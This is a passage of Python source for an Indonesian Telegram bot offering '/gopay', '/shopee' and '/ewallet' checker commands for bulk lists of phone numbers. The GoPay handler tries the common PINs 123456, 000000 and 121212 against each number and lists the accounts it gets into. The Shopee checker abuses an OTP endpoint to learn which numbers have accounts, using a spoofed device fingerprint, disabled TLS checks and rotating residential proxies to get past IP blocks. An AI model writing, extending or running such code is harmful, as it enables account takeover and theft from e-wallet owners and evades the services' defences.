            f"{em(CE_LOADING,'🔄')} <b>GOPAY CHECKER</b>\n\n"
            f"  {bar} <b>{pct}%</b>\n"
            f"  {em(CE_NOMOR,'📞')} <b>Progress:</b>  {done}/{total}\n"
            f"  {em(E6,'🚀')} <b>Workers:</b>  {GOPAY_MAX_WORKERS}\n\n"
            f"  {em(E1,'✅')} Terdaftar: <b>{len(results['registered'])}</b>\n"
            f"  {em(E2,'❌')} Tidak Terdaftar: <b>{len(results['not_registered'])}</b>\n"
            f"  {em(E3,'⏳')} Rate Limited: <b>{len(results['rate_limited'])}</b>\n"
            f"  {em(E2,'⚠️')} Error: <b>{len(results['error'])}</b>\n"
        )
        
        try:
            await msg.edit_text(
                _screen('GOPAY CHECKER', body, 'Home › GoPay › Processing'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    
    # Run workers
    with ThreadPoolExecutor(max_workers=GOPAY_MAX_WORKERS) as pool:
        futures = []
        for phone in phones:
            if not _gopay_active.get(user_id, False):
                break
            futures.append(pool.submit(_do_check, phone))
        
        while any(not f.done() for f in futures):
            await _update_progress()
            await asyncio.sleep(1)
    
    await _update_progress(force=True)
    _gopay_active[user_id] = False
    
    # ═══ Build final result ═══
    total_checked = done
    
    # Determine apakah kirim via file atau langsung
    send_as_file = total_checked > 10
    
    # Build result text
    body_parts = []
    body_parts.append(
        f"{em(E1,'✅')} <b>GOPAY CHECK SELESAI</b>\n\n"
        f"  {em(CE_NOMOR,'📞')} <b>Total:</b>  {total_checked}\n"
        f"  {em(E1,'✅')} <b>Terdaftar:</b>  {len(results['registered'])}\n"
        f"  {em(E2,'❌')} <b>Tidak Terdaftar:</b>  {len(results['not_registered'])}\n"
        f"  {em(E3,'⏳')} <b>Rate Limited:</b>  {len(results['rate_limited'])}\n"
        f"  {em(E2,'⚠️')} <b>Error:</b>  {len(results['error'])}\n"
    )
    
    if not send_as_file:
        # Langsung tampilkan di chat
        if results["success"]:
            body_parts.append(f"\n{em(E1,'✅')} <b>═══ PIN SUKSES ═══</b>")
            for r in results["success"]:
                body_parts.append(
                    f"  {em(E1,'✅')} <code>+{r['phone']}</code>\n"
                    f"      PIN: <code>{r['pin']}</code>\n"
                    f"      Status: <b>Successfull</b>"
                )
        
        if results["registered"]:
            body_parts.append(f"\n{em(E1,'✅')} <b>═══ TERDAFTAR (PREMIUM) ═══</b>")
            for r in results["registered"]:
                body_parts.append(f"  {em(E1,'✅')} <code>+{r['phone']}</code> — {r['detail']}")
        
        if results["not_registered"]:
            body_parts.append(f"\n{em(E2,'❌')} <b>═══ TIDAK TERDAFTAR ═══</b>")
            for r in results["not_registered"]:
                body_parts.append(f"  {em(E2,'❌')} <code>+{r['phone']}</code>")
        
        if results["rate_limited"]:
            body_parts.append(f"\n{em(E3,'⏳')} <b>═══ RATE LIMITED ═══</b>")
            for r in results["rate_limited"]:
                body_parts.append(f"  {em(E3,'⏳')} <code>+{r['phone']}</code>")
        
        if results["error"]:
            body_parts.append(f"\n{em(E2,'⚠️')} <b>═══ ERROR ═══</b>")
            for r in results["error"]:
                body_parts.append(f"  {em(E2,'⚠️')} <code>+{r['phone']}</code> — {r['detail']}")
        
        try:
            await msg.edit_text(
                _screen('GOPAY CHECKER', '\n'.join(body_parts), 'Home › GoPay › Results'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    else:
        # Kirim via file TXT
        file_lines = []
        file_lines.append("═══════════════════════════════════════")
        file_lines.append("       GOPAY CHECKER RESULTS")
        file_lines.append(f"       Total: {total_checked}")
        file_lines.append("═══════════════════════════════════════\n")
        
        if results["success"]:
            file_lines.append("✅ ═══ SUCCESS (PIN BENAR) ═══")
            for r in results["success"]:
                file_lines.append(f"")
                file_lines.append(f"  Success")
                file_lines.append(f"  Nomor  : +{r['phone']}")
                file_lines.append(f"  Pin    : {r['pin']}")
                file_lines.append(f"  Status : Successfull")
            file_lines.append("")
        
        if results["registered"]:
            file_lines.append("📋 ═══ TERDAFTAR ═══")
            for r in results["registered"]:
                file_lines.append(f"")
                file_lines.append(f"  Terdaftar")
                file_lines.append(f"  Nomor : +{r['phone']}")
            file_lines.append("")
        
        if results["not_registered"]:
            file_lines.append("❌ ═══ TIDAK TERDAFTAR ═══")
            for r in results["not_registered"]:
                file_lines.append(f"")
                file_lines.append(f"  Tidak Terdaftar")
                file_lines.append(f"  Nomor : +{r['phone']}")
            file_lines.append("")
        
        if results["error"]:
            file_lines.append("⚠️ ═══ ERROR ═══")
            for r in results["error"]:
                file_lines.append(f"  +{r['phone']} — {r['detail']}")
            file_lines.append("")
        
        file_content = '\n'.join(file_lines)
        
        from io import BytesIO
        bio = BytesIO(file_content.encode('utf-8'))
        bio.name = f"gopay_result_{user_id}_{int(time.time())}.txt"
        
        summary = '\n'.join(body_parts)
        
        try:
            await msg.edit_text(
                _screen('GOPAY CHECKER', summary, 'Home › GoPay › Results'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
        
        try:
            await msg.reply_document(
                document=bio,
                caption=f"{em(CE_FILE,'📁')} <b>Hasil GoPay Checker</b> — {total_checked} nomor",
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            print(f"[GOPAY] Gagal kirim file: {e}")


async def gopay_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /gopay — Checker akun GoPay + brute PIN."""
    user_id = update.effective_user.id
    
    if _gopay_active.get(user_id, False):
        await update.message.reply_text(
            _screen('GOPAY CHECKER', (
                f"{em(E2,'⚠️')} <b>Masih ada proses berjalan!</b>\n\n"
                f"Tunggu selesai dulu ya."
            )),
            parse_mode=ParseMode.HTML,
        )
        return
    
    phones = None
    invalid = []
    
    msg = update.message
    has_doc = (msg.reply_to_message and msg.reply_to_message.document) or msg.document
    
    if has_doc:
        loading = await msg.reply_text(
            f"{em(CE_LOADING,'🔄')} <i>Membaca file...</i>",
            parse_mode=ParseMode.HTML,
        )
        phones, err = await _gopay_parse_phones_from_doc(update, context)
        if err or not phones:
            await loading.edit_text(
                _screen('GOPAY CHECKER', f"{em(E2,'❌')} {err or 'Tidak ada nomor valid di file.'}"),
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            await loading.delete()
        except:
            pass
    else:
        raw_text = msg.text or ''
        raw_text = re.sub(r'^/gopay\s*', '', raw_text, flags=re.IGNORECASE).strip()
        
        if not raw_text:
            await msg.reply_text(
                _screen('GOPAY CHECKER', (
                    f"{em(E5,'💰')} <b>GOPAY ACCOUNT CHECKER</b>\n\n"
                    f"Check apakah nomor terdaftar di GoPay dan coba 3 PIN.\n\n"
                    f"<b>Cara pakai:</b>\n"
                    f"  • <code>/gopay 6285825306011</code>\n"
                    f"  • <code>/gopay 628xx 628yy 628zz</code>\n"
                    f"  • Reply file <code>.txt</code> dengan <code>/gopay</code>\n\n"
                    f"<b>PIN yang dicoba:</b>\n"
                    f"  🔑 <code>123456</code> | <code>000000</code> | <code>121212</code>\n\n"
                    f"<b>Status:</b>\n"
                    f"  {em(E1,'✅')} <b>Success</b> = PIN berhasil ditemukan\n"
                    f"  {em(E3,'📋')} <b>Terdaftar</b> = akun ada, PIN salah\n"
                    f"  {em(E2,'❌')} <b>Tidak Terdaftar</b> = nomor bukan GoPay\n\n"
                    f"<b>Fitur:</b>\n"
                    f"  {em(E6,'🚀')} {GOPAY_MAX_WORKERS} worker paralel\n"
                    f"  {em(CE_FILE,'📁')} Auto export .txt jika >10 nomor\n"
                    f"  {em(CE_NOMOR,'📞')} Support file & inline\n\n"
                    f"{em(CE_WAKTU,'⏲')} <i>Format: 628xxx / +628xxx / 08xxx</i>"
                ), 'Home › GoPay'),
                parse_mode=ParseMode.HTML,
            )
            return
        
        raw_numbers = re.split(r'[\s,;|\n]+', raw_text)
        phones = []
        for raw in raw_numbers:
            if not raw.strip():
                continue
            cleaned = _gopay_normalize_phone(raw)
            if 8 <= len(cleaned) <= 14:
                phones.append(cleaned)
            else:
                invalid.append(raw)
    
    if not phones:
        await msg.reply_text(
            _screen('GOPAY CHECKER', (
                f"{em(E2,'❌')} <b>Tidak ada nomor valid!</b>\n\n"
                f"Contoh: <code>/gopay 6285825306011</code>"
            ), 'Home › GoPay'),
            parse_mode=ParseMode.HTML,
        )
        return
    
    phones = list(dict.fromkeys(phones))
    
    # Limit 50 nomor untuk non-owner
    GOPAY_USER_LIMIT = 50
    if not is_owner(user_id) and len(phones) > GOPAY_USER_LIMIT:
        phones = phones[:GOPAY_USER_LIMIT]
    
    # Start langsung tanpa konfirmasi
    est = max(3, int(len(phones) / GOPAY_MAX_WORKERS * 4))
    
    progress_msg = await msg.reply_text(
        _screen('GOPAY CHECKER', (
            f"{em(CE_LOADING,'🔄')} <b>Memulai {len(phones)} nomor ({GOPAY_MAX_WORKERS} workers)...</b>\n\n"
            f"  {em(CE_NOMOR,'📞')} <b>Total:</b>  {len(phones)}\n"
            f"  {em(E6,'🚀')} <b>Workers:</b>  {GOPAY_MAX_WORKERS}\n"
            f"  🔑 <b>PINs:</b>  {', '.join(GOPAY_PINS)}\n\n"
            f"{em(CE_WAKTU,'⏲')} <i>Estimasi: ~{est} detik</i>"
        ), 'Home › GoPay › Processing'),
        parse_mode=ParseMode.HTML,
    )
    
    asyncio.create_task(_gopay_process_batch(phones, user_id, progress_msg, context))


# ██  SHOPEE CHECKER — /shopee
# ══════════════════════════════════════════════════════════════════════════════
# Endpoint: POST https://shopee.co.id/api/v4/otp/get_settings_v2
# Logic: available_channels > 1 item = Terdaftar, [2] only = Tidak Terdaftar
# No captcha/x-sap-sec needed! Just needs device fingerprint in payload.
# ══════════════════════════════════════════════════════════════════════════════

SHOPEE_MAX_WORKERS = 15
SHOPEE_ENDPOINT = "https://shopee.co.id/api/v4/otp/get_settings_v2"
SHOPEE_UA = "Mozilla/5.0 (Linux; Android 15; 25062RN2DY Build/AQ3A.250226.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7827.91 Mobile Safari/537.36"
SHOPEE_FINGERPRINT = "Gl8ZU4LFOwn7WAk7o3St8g==|IpN3dhcNp1jLmeHUVaWz+CybrngWfA3DS9KcCpgHhI2mNSy/xBDQY2o1UCNmJE9FeX979KSUhN1BodSY|w2tVEWcIwrS9NDro|08|3"

_shopee_active = {}  # {user_id: bool}


def _shopee_normalize_phone(raw: str) -> str:
    """Bersihkan nomor ke format 628xxx."""
    stripped = raw.strip()
    if stripped.startswith('+'):
        stripped = stripped[1:]
    cleaned = re.sub(r'[^\d]', '', stripped)
    if not cleaned:
        return ''
    if cleaned.startswith('0') and len(cleaned) >= 10:
        cleaned = '62' + cleaned[1:]
    return cleaned


def _shopee_check_single(phone: str) -> dict:
    """Check single phone on Shopee via otp/get_settings_v2.
    Uses requests with fingerprint in payload — confirmed working.
    Logic: channels > 1 = registered, [2] only = not registered.
    """
    result = {"phone": phone, "status": "unknown", "detail": "", "channels": []}

    # VPS / datacenter IP diblok Shopee (error 23500158).
    # Solusi: rotasi proxy residensial pakai pool yang sama dgn GoPay.
    _gopay_load_proxies()

    headers = {
        "User-Agent": SHOPEE_UA,
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Origin": "https://shopee.co.id",
        "Referer": "https://shopee.co.id/buyer/login/otp",
        "x-api-source": "rweb",
        "x-shopee-language": "id",
        "af-ac-enc-sz-token": SHOPEE_FINGERPRINT,
    }

    payload = {
        "operation": 7,
        "encrypted_phone": "",
        "phone": phone,
        "supported_channels": [1, 2, 3, 6, 0, 5],
        "support_session": True,
        "client_identifier": {"security_device_fingerprint": SHOPEE_FINGERPRINT}
    }

    ip_blocked_once = False

    for attempt in range(10):
        try:
            sess = requests.Session()
            sess.verify = False

            # Pakai proxy kalau: bukan attempt pertama, ATAU IP udah kebukti keblok.
            # Di VPS, attempt pertama (direct) bakal keblok -> langsung rotasi proxy.
            if (attempt > 0 or ip_blocked_once) and _gopay_proxy_pool:
                px = random.choice(_gopay_proxy_pool)
                sess.proxies = {"http": px, "https": px}

            r = sess.post(SHOPEE_ENDPOINT, headers=headers, json=payload, timeout=12)

            if r.status_code == 429:
                time.sleep(random.uniform(2, 4))
                continue

            if r.status_code != 200:
                time.sleep(1)
                continue

            d = r.json()
            err_code = d.get("error", -1)

            # IP keblok Shopee -> tandai & rotasi proxy di attempt berikutnya
            if err_code == 23500158:
                ip_blocked_once = True
                time.sleep(random.uniform(1, 2))
                continue

            if err_code != 0:
                result["status"] = "error"
                result["detail"] = f"API err={err_code}"
                return result

            data = d.get("data", {})
            channels = data.get("available_channels", [])
            result["channels"] = channels

            if len(channels) > 1:
                result["status"] = "registered"
                ch_names = []
                for c in channels:
                    if c == 1: ch_names.append("Call")
                    elif c == 2: ch_names.append("SMS")
                    elif c == 3: ch_names.append("WhatsApp")
                    else: ch_names.append(f"Ch{c}")
                result["detail"] = ", ".join(ch_names)
            else:
                result["status"] = "not_registered"
                result["detail"] = "Tidak terdaftar"
            return result

        except requests.exceptions.Timeout:
            time.sleep(1)
            continue
        except Exception as e:
            print(f"[SHOPEE] attempt {attempt+1} failed for {phone}: {e}")
            time.sleep(1)

    # Semua attempt gagal — kemungkinan besar IP keblok & gak ada proxy yg jalan
    if ip_blocked_once:
        result["status"] = "error"
        result["detail"] = "IP keblok Shopee (butuh proxy residensial, isi via /proxy)"
    else:
        result["status"] = "error"
        result["detail"] = "All attempts failed"
    return result



async def _shopee_parse_phones_from_doc(update, context):
    """Parse nomor dari file .txt."""
    msg = update.message
    doc = None
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
    elif msg.document:
        doc = msg.document

    if not doc:
        return None, "Tidak ada file"
    if doc.file_size > 5 * 1024 * 1024:
        return None, "File terlalu besar (max 5MB)"

    try:
        f = await doc.get_file()
        data = await f.download_as_bytearray()
        text = data.decode('utf-8', errors='ignore')
    except Exception as e:
        return None, f"Gagal download: {e}"

    lines = text.strip().splitlines()
    phones = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        for part in re.split(r'[\s,;|]+', line):
            cleaned = _shopee_normalize_phone(part)
            if 8 <= len(cleaned) <= 14:
                phones.append(cleaned)

    if not phones:
        return None, "Tidak ada nomor valid di file"
    return phones, None


async def _shopee_process_batch(phones: list, user_id: int, msg, context):
    """Proses batch check Shopee."""
    _shopee_active[user_id] = True

    results = {"registered": [], "not_registered": [], "rate_limited": [], "error": []}
    total = len(phones)
    done = 0
    lock = threading.Lock()
    last_edit = [0]
    loop = asyncio.get_event_loop()

    def _do_check(phone):
        nonlocal done
        res = _shopee_check_single(phone)
        with lock:
            done += 1
            if res["status"] == "registered":
                results["registered"].append(res)
            elif res["status"] == "not_registered":
                results["not_registered"].append(res)
            elif res["status"] == "rate_limited":
                results["rate_limited"].append(res)
            else:
                results["error"].append(res)
        return res

    async def _update_progress(force=False):
        now = time.time()
        if not force and now - last_edit[0] < 2:
            return
        last_edit[0] = now
        pct = int(done / total * 100) if total else 0
        bar_len = 15
        filled = int(bar_len * done / total) if total else 0
        bar = "\u2588" * filled + "\u2591" * (bar_len - filled)

        body = (
            f"{em(CE_LOADING,'\U0001f4e6')} <b>SHOPEE CHECKER</b>\n\n"
            f"  {bar} <b>{pct}%</b>\n"
            f"  {em(CE_NOMOR,'\U0001f4de')} <b>Progress:</b>  {done}/{total}\n"
            f"  {em(E6,'\U0001f680')} <b>Workers:</b>  {SHOPEE_MAX_WORKERS}\n\n"
            f"  {em(E1,'\u2705')} Terdaftar: <b>{len(results['registered'])}</b>\n"
            f"  {em(E2,'\u274c')} Tidak Terdaftar: <b>{len(results['not_registered'])}</b>\n"
            f"  {em(E3,'\u23f3')} Rate Limited: <b>{len(results['rate_limited'])}</b>\n"
            f"  {em(E2,'\u26a0\ufe0f')} Error: <b>{len(results['error'])}</b>\n"
        )

        try:
            await msg.edit_text(
                _screen('SHOPEE CHECKER', body, 'Home \u203a Shopee \u203a Processing'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=SHOPEE_MAX_WORKERS) as pool:
        futures = []
        for phone in phones:
            if not _shopee_active.get(user_id, False):
                break
            futures.append(pool.submit(_do_check, phone))
        while any(not f.done() for f in futures):
            await _update_progress()
            await asyncio.sleep(1)

    await _update_progress(force=True)
    _shopee_active[user_id] = False

    # Build final result
    total_checked = done
    send_as_file = total_checked > 10

    body_parts = []
    body_parts.append(
        f"{em(E1,'\u2705')} <b>SHOPEE CHECK SELESAI</b>\n\n"
        f"  {em(CE_NOMOR,'\U0001f4de')} <b>Total:</b>  {total_checked}\n"
        f"  {em(E1,'\u2705')} <b>Terdaftar:</b>  {len(results['registered'])}\n"
        f"  {em(E2,'\u274c')} <b>Tidak Terdaftar:</b>  {len(results['not_registered'])}\n"
        f"  {em(E3,'\u23f3')} <b>Rate Limited:</b>  {len(results['rate_limited'])}\n"
        f"  {em(E2,'\u26a0\ufe0f')} <b>Error:</b>  {len(results['error'])}\n"
    )

    if not send_as_file:
        if results["registered"]:
            body_parts.append(f"\n{em(E1,'\u2705')} <b>\u2550\u2550\u2550 TERDAFTAR \u2550\u2550\u2550</b>")
            for r in results["registered"]:
                body_parts.append(f"  {em(E1,'\u2705')} <code>+{r['phone']}</code> \u2014 {r['detail']}")

        if results["not_registered"]:
            body_parts.append(f"\n{em(E2,'\u274c')} <b>\u2550\u2550\u2550 TIDAK TERDAFTAR \u2550\u2550\u2550</b>")
            for r in results["not_registered"]:
                body_parts.append(f"  {em(E2,'\u274c')} <code>+{r['phone']}</code>")

        if results["rate_limited"]:
            body_parts.append(f"\n{em(E3,'\u23f3')} <b>\u2550\u2550\u2550 RATE LIMITED \u2550\u2550\u2550</b>")
            for r in results["rate_limited"]:
                body_parts.append(f"  {em(E3,'\u23f3')} <code>+{r['phone']}</code>")

        try:
            await msg.edit_text(
                _screen('SHOPEE CHECKER', '\n'.join(body_parts), 'Home \u203a Shopee \u203a Results'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    else:
        file_lines = []
        file_lines.append("\u2550" * 39)
        file_lines.append("       SHOPEE CHECKER RESULTS")
        file_lines.append(f"       Total: {total_checked}")
        file_lines.append("\u2550" * 39 + "\n")

        if results["registered"]:
            file_lines.append("\u2705 \u2550\u2550\u2550 TERDAFTAR \u2550\u2550\u2550")
            for r in results["registered"]:
                file_lines.append(f"")
                file_lines.append(f"  Terdaftar")
                file_lines.append(f"  Nomor   : +{r['phone']}")
                file_lines.append(f"  Channel : {r['detail']}")
                file_lines.append(f"  App     : Shopee")
            file_lines.append("")

        if results["not_registered"]:
            file_lines.append("\u274c \u2550\u2550\u2550 TIDAK TERDAFTAR \u2550\u2550\u2550")
            for r in results["not_registered"]:
                file_lines.append(f"  +{r['phone']}")
            file_lines.append("")

        file_content = '\n'.join(file_lines)

        from io import BytesIO
        bio = BytesIO(file_content.encode('utf-8'))
        bio.name = f"shopee_result_{user_id}_{int(time.time())}.txt"

        summary = '\n'.join(body_parts)
        try:
            await msg.edit_text(
                _screen('SHOPEE CHECKER', summary, 'Home \u203a Shopee \u203a Results'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

        try:
            await msg.reply_document(
                document=bio,
                caption=f"{em(CE_FILE,'\U0001f4c1')} <b>Hasil Shopee Checker</b> \u2014 {total_checked} nomor",
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            print(f"[SHOPEE] Gagal kirim file: {e}")


async def shopee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /shopee \u2014 Check registrasi Shopee."""
    user_id = update.effective_user.id

    if _shopee_active.get(user_id, False):
        await update.message.reply_text(
            _screen('SHOPEE CHECKER', (
                f"{em(E2,'\u26a0\ufe0f')} <b>Masih ada proses berjalan!</b>\n\n"
                f"Tunggu selesai dulu ya."
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    phones = None
    invalid = []
    msg = update.message
    has_doc = (msg.reply_to_message and msg.reply_to_message.document) or msg.document

    if has_doc:
        loading = await msg.reply_text(
            f"{em(CE_LOADING,'\U0001f504')} <i>Membaca file...</i>",
            parse_mode=ParseMode.HTML,
        )
        phones, err = await _shopee_parse_phones_from_doc(update, context)
        if err or not phones:
            await loading.edit_text(
                _screen('SHOPEE CHECKER', f"{em(E2,'\u274c')} {err or 'Tidak ada nomor valid di file.'}"),
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            await loading.delete()
        except:
            pass
    else:
        raw_text = msg.text or ''
        raw_text = re.sub(r'^/shopee\s*', '', raw_text, flags=re.IGNORECASE).strip()

        if not raw_text:
            await msg.reply_text(
                _screen('SHOPEE CHECKER', (
                    f"{em(E5,'\U0001f6d2')} <b>SHOPEE REGISTRATION CHECKER</b>\n\n"
                    f"Check apakah nomor terdaftar di Shopee.\n\n"
                    f"<b>Cara pakai:</b>\n"
                    f"  \u2022 <code>/shopee 6285825306013</code>\n"
                    f"  \u2022 <code>/shopee 628xx 628yy 628zz</code>\n"
                    f"  \u2022 Reply file <code>.txt</code> dengan <code>/shopee</code>\n\n"
                    f"<b>Status:</b>\n"
                    f"  {em(E1,'\u2705')} <b>Terdaftar</b> = nomor punya akun Shopee\n"
                    f"  {em(E2,'\u274c')} <b>Tidak Terdaftar</b> = nomor belum register\n\n"
                    f"<b>Fitur:</b>\n"
                    f"  {em(E6,'\U0001f680')} {SHOPEE_MAX_WORKERS} worker paralel\n"
                    f"  {em(CE_FILE,'\U0001f4c1')} Auto export .txt jika >10 nomor\n"
                    f"  {em(CE_NOMOR,'\U0001f4de')} Support file & inline\n\n"
                    f"{em(CE_WAKTU,'\u23f2')} <i>Format: 628xxx / +628xxx / 08xxx</i>"
                ), 'Home \u203a Shopee'),
                parse_mode=ParseMode.HTML,
            )
            return

        raw_numbers = re.split(r'[\s,;|\n]+', raw_text)
        phones = []
        for raw in raw_numbers:
            if not raw.strip():
                continue
            cleaned = _shopee_normalize_phone(raw)
            if 8 <= len(cleaned) <= 14:
                phones.append(cleaned)
            else:
                invalid.append(raw)

    if not phones:
        await msg.reply_text(
            _screen('SHOPEE CHECKER', (
                f"{em(E2,'\u274c')} <b>Tidak ada nomor valid!</b>\n\n"
                f"Contoh: <code>/shopee 6285825306013</code>"
            ), 'Home \u203a Shopee'),
            parse_mode=ParseMode.HTML,
        )
        return

    phones = list(dict.fromkeys(phones))

    SHOPEE_USER_LIMIT = 50
    if user_id != USER_ID and len(phones) > SHOPEE_USER_LIMIT:
        phones = phones[:SHOPEE_USER_LIMIT]

    est = max(3, int(len(phones) / SHOPEE_MAX_WORKERS * 3))

    progress_msg = await msg.reply_text(
        _screen('SHOPEE CHECKER', (
            f"{em(CE_LOADING,'\U0001f504')} <b>Memulai {len(phones)} nomor ({SHOPEE_MAX_WORKERS} workers)...</b>\n\n"
            f"  {em(CE_NOMOR,'\U0001f4de')} <b>Total:</b>  {len(phones)}\n"
            f"  {em(E6,'\U0001f680')} <b>Workers:</b>  {SHOPEE_MAX_WORKERS}\n\n"
            f"{em(CE_WAKTU,'\u23f2')} <i>Estimasi: ~{est} detik</i>"
        ), 'Home \u203a Shopee \u203a Processing'),
        parse_mode=ParseMode.HTML,
    )

    asyncio.create_task(_shopee_process_batch(phones, user_id, progress_msg, context))


# ██  E-WALLET CHECKER — /ewallet (Gabungan GoPay + Shopee)
# ══════════════════════════════════════════════════════════════════════════════

EWALLET_MAX_WORKERS = 15
_ewallet_active = {}


async def _ewallet_process_batch(phones: list, user_id: int, msg, context):
    """Proses batch check GoPay + Shopee gabungan."""
    _ewallet_active[user_id] = True

    results = []  # [{phone, gopay_status, shopee_status, apps:[]}]
    total = len(phones)
    done = 0
    lock = threading.Lock()
    last_edit = [0]

    def _do_check(phone):
        nonlocal done
        gopay_res = _gopay_check_single(phone)
        shopee_res = _shopee_check_single(phone)

        entry = {
            "phone": phone,
            "gopay": gopay_res["status"],
            "gopay_detail": gopay_res.get("detail", ""),
            "shopee": shopee_res["status"],
            "shopee_detail": shopee_res.get("detail", ""),
            "apps": [],
        }
        if gopay_res["status"] in ("registered", "pin_success"):
            entry["apps"].append("GoPay")
        if shopee_res["status"] == "registered":
            entry["apps"].append("Shopee")

        with lock:
            done += 1
            results.append(entry)
        return entry

    async def _update_progress(force=False):
        now = time.time()
        if not force and now - last_edit[0] < 2:
            return
        last_edit[0] = now
        pct = int(done / total * 100) if total else 0
        bar_len = 15
        filled = int(bar_len * done / total) if total else 0
        bar = "\u2588" * filled + "\u2591" * (bar_len - filled)

        reg_count = sum(1 for r in results if r["apps"])
        unreg_count = sum(1 for r in results if not r["apps"])

        body = (
            f"{em(CE_LOADING,'\U0001f4b3')} <b>E-WALLET CHECKER</b>\n"
            f"<i>GoPay + Shopee</i>\n\n"
            f"  {bar} <b>{pct}%</b>\n"
            f"  {em(CE_NOMOR,'\U0001f4de')} <b>Progress:</b>  {done}/{total}\n"
            f"  {em(E6,'\U0001f680')} <b>Workers:</b>  {EWALLET_MAX_WORKERS}\n\n"
            f"  {em(E1,'\u2705')} Terdaftar: <b>{reg_count}</b>\n"
            f"  {em(E2,'\u274c')} Tidak Terdaftar: <b>{unreg_count}</b>\n"
        )
        try:
            await msg.edit_text(
                _screen('E-WALLET CHECKER', body, 'Home \u203a E-Wallet \u203a Processing'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=EWALLET_MAX_WORKERS) as pool:
        futures = []
        for phone in phones:
            if not _ewallet_active.get(user_id, False):
                break
            futures.append(pool.submit(_do_check, phone))
        while any(not f.done() for f in futures):
            await _update_progress()
            await asyncio.sleep(1)

    await _update_progress(force=True)
    _ewallet_active[user_id] = False

    # Categorize
    registered = [r for r in results if r["apps"]]
    not_registered = [r for r in results if not r["apps"]]

    send_as_file = len(results) > 10

    body_parts = []
    body_parts.append(
        f"{em(E1,'\u2705')} <b>E-WALLET CHECK SELESAI</b>\n"
        f"<i>GoPay + Shopee gabungan</i>\n\n"
        f"  {em(CE_NOMOR,'\U0001f4de')} <b>Total:</b>  {len(results)}\n"
        f"  {em(E1,'\u2705')} <b>Terdaftar (min 1 app):</b>  {len(registered)}\n"
        f"  {em(E2,'\u274c')} <b>Tidak Terdaftar:</b>  {len(not_registered)}\n"
    )

    if not send_as_file:
        if registered:
            body_parts.append(f"\n{em(E1,'\u2705')} <b>\u2550\u2550\u2550 TERDAFTAR \u2550\u2550\u2550</b>")
            for r in registered:
                apps_str = " | ".join(r["apps"])
                body_parts.append(
                    f"  {em(E1,'\u2705')} <code>+{r['phone']}</code>\n"
                    f"      App: <b>{apps_str}</b>"
                )

        if not_registered:
            body_parts.append(f"\n{em(E2,'\u274c')} <b>\u2550\u2550\u2550 TIDAK TERDAFTAR \u2550\u2550\u2550</b>")
            for r in not_registered:
                body_parts.append(f"  {em(E2,'\u274c')} <code>+{r['phone']}</code>")

        try:
            await msg.edit_text(
                _screen('E-WALLET CHECKER', '\n'.join(body_parts), 'Home \u203a E-Wallet \u203a Results'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    else:
        file_lines = []
        file_lines.append("\u2550" * 39)
        file_lines.append("       E-WALLET CHECKER RESULTS")
        file_lines.append("       GoPay + Shopee")
        file_lines.append(f"       Total: {len(results)}")
        file_lines.append("\u2550" * 39 + "\n")

        if registered:
            file_lines.append("\u2705 \u2550\u2550\u2550 TERDAFTAR \u2550\u2550\u2550")
            for r in registered:
                apps_str = " | ".join(r["apps"])
                file_lines.append("")
                file_lines.append(f"  Terdaftar")
                file_lines.append(f"  Nomor : +{r['phone']}")
                file_lines.append(f"  App   : {apps_str}")
                if r["gopay"] in ("registered", "pin_success"):
                    file_lines.append(f"  GoPay : {r['gopay_detail']}")
                if r["shopee"] == "registered":
                    file_lines.append(f"  Shopee: {r['shopee_detail']}")
            file_lines.append("")

        if not_registered:
            file_lines.append("\u274c \u2550\u2550\u2550 TIDAK TERDAFTAR \u2550\u2550\u2550")
            for r in not_registered:
                file_lines.append(f"  +{r['phone']}")
            file_lines.append("")

        file_content = '\n'.join(file_lines)

        from io import BytesIO
        bio = BytesIO(file_content.encode('utf-8'))
        bio.name = f"ewallet_result_{user_id}_{int(time.time())}.txt"

        summary = '\n'.join(body_parts)
        try:
            await msg.edit_text(
                _screen('E-WALLET CHECKER', summary, 'Home \u203a E-Wallet \u203a Results'),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

        try:
            await msg.reply_document(
                document=bio,
                caption=f"{em(CE_FILE,'\U0001f4c1')} <b>Hasil E-Wallet Checker</b> \u2014 {len(results)} nomor",
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            print(f"[EWALLET] Gagal kirim file: {e}")


async def ewallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /ewallet \u2014 Combined GoPay + Shopee checker."""
    user_id = update.effective_user.id

    if _ewallet_active.get(user_id, False):
        await update.message.reply_text(
            _screen('E-WALLET CHECKER', (
                f"{em(E2,'\u26a0\ufe0f')} <b>Masih ada proses berjalan!</b>\n\n"
                f"Tunggu selesai dulu ya."
            )),
            parse_mode=ParseMode.HTML,
        )
        return

    phones = None
    invalid = []
    msg = update.message
    has_doc = (msg.reply_to_message and msg.reply_to_message.document) or msg.document

    if has_doc:
        loading = await msg.reply_text(
            f"{em(CE_LOADING,'\U0001f504')} <i>Membaca file...</i>",
            parse_mode=ParseMode.HTML,
        )
        phones, err = await _shopee_parse_phones_from_doc(update, context)
        if err or not phones:
            await loading.edit_text(
                _screen('E-WALLET CHECKER', f"{em(E2,'\u274c')} {err or 'Tidak ada nomor valid.'}"),
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            await loading.delete()
        except:
            pass
    else:
        raw_text = msg.text or ''
